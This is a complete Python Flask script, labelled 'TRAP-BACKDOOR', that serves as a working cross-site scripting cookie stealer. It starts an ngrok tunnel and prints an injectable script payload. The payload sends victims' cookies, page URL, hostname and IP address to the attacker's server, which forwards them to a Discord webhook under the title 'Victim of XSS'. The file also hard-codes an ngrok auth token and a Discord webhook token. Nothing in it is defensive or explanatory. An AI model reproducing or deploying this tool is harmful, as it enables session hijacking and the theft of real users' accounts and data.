from flask import Flask, request
from webhook import Webhook
from pyngrok import ngrok
from colorama import init, Fore
from datetime import datetime
import user_agents
import os
import re

os.system("ngrok config add-authtoken 2EcFi3NgdSCjz541gmD1ChlnGOr_6wiepJMBeBSVCGoRkm5Lf  || ./ngrok config add-authtoken 2EcFi3NgdSCjz541gmD1ChlnGOr_6wiepJMBeBSVCGoRkm5Lf ")
init()

# id, token type
wh = Webhook(id="1389642689057919206", token="lq0EcP-atEkwqYizKAM2RK2EqKYQypMATdUKXbPfX8geKvXlWPv0Fsj5_7hj5N47HikI")

# or

# URL type
#url = "https://discord.com/api/webhooks/1389642689057919206/lq0EcP-atEkwqYizKAM2RK2EqKYQypMATdUKXbPfX8geKvXlWPv0Fsj5_7hj5N47HikI"
#wh = Webhook(url=url)


print(f"[{Fore.MAGENTA}TRAP-BACKDOOR{Fore.RESET}]")
app = Flask(__name__)

@app.route('/')
def home():
    all_params = request.args.items()
    user_agent_string = request.headers.get('User-Agent', 'Unknown Device')
    ua = user_agents.parse(user_agent_string)
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    server_ip = request.host.split(':')[0]
    client_ip = request.remote_addr
    domain_name = request.host

    cookies = request.cookies
    host_cookie = cookies.get('host', 'Unknown Host')

    if ua.device.family == 'Other':
        device_type = 'Unknown Host'
    elif ua.is_mobile:
        device_type = 'Mobile Device'
    elif ua.is_tablet:
        device_type = 'Tablet'
    else:
        device_type = 'Computer'

    hostvalue = "Not Found"
    visited_url = "Not Found"
    ip = "Not Found"
    CookiesText = ""
    for param, value in all_params:
        if param == 'host':
            hostvalue = value
        elif param == 'url':
            visited_url = value
        elif param == 'ip':
            ip = value
        else:
            CookiesText += f"{Fore.YELLOW}{param}={value}{Fore.RESET}\n"

    CookiesText = CookiesText if CookiesText.strip() != "" else "Not Found"
    CookiesTextConsole = CookiesText.replace("; ", "\n")
    CookiesText = CookiesText.replace("; ", "\n\n")

    print(f"{Fore.MAGENTA}Domain: {hostvalue}{Fore.RESET}")
    print(f"{Fore.CYAN}URL: {visited_url}{Fore.RESET}")
    print(f"{Fore.GREEN}User Ip: {ip}{Fore.RESET}")
    print(f"{Fore.GREEN}Date: {current_time}{Fore.RESET}")
    print(f"{Fore.BLUE}Operating System: {ua.os.family} {ua.os.version_string}{Fore.RESET}")
    print(f"{Fore.BLUE}Device: {ua.device.family} ({device_type}){Fore.RESET}")
    print(f"{Fore.BLUE}Browser: {ua.browser.family} {ua.browser.version_string}{Fore.RESET}")
    print(f"{Fore.YELLOW}Cookies:\n{CookiesTextConsole}{Fore.RESET}")

    def remove_ansi_codes(text):
        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
        return ansi_escape.sub('', text)

    try:
        wh.send_embed(
            title="Victim of XSS",
            description="Information from the payload.",
            color=0xFFFFFF,
            fields=[
                ("Domain", hostvalue),
                ("URL", visited_url),
                ("User Ip", ip),
                ("Date", current_time),
                ("Operating System", f"{ua.os.family} {ua.os.version_string}"),
                ("Device", f"{ua.device.family} ({device_type})"),
                ("Browser", f"{ua.browser.family} {ua.browser.version_string}"),
                ("Cookies", remove_ansi_codes(CookiesText))
            ],
            footer="-Flagway"
        )

        print(f"{Fore.GREEN}A message has been sent to webhook.")

    except Exception as e:
        wh.send_message("Error:", e)
        print("Hata:", e)


    js_payload = f'{ngrok_url}'
    print("\n")

    return js_payload


def start_ngrok():
    public_url = ngrok.connect(5000)
    ngrok_url = public_url.public_url.replace("NgrokTunnel: ", "").split(" -> ")[0]

    return ngrok_url

if __name__ == '__main__':

    ngrok_url = start_ngrok()
    print(f"Ngrok URL: {ngrok_url}")
    print('Payload Backdoor-Url: <script>fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"_").then(ip=>{new Image().src="'+ ngrok_url +'/?"+document.cookie+"&host="+location.hostname+"&url="+encodeURIComponent(location.href)+"&ip="+ip})</script>')

    app.run(port=5000)
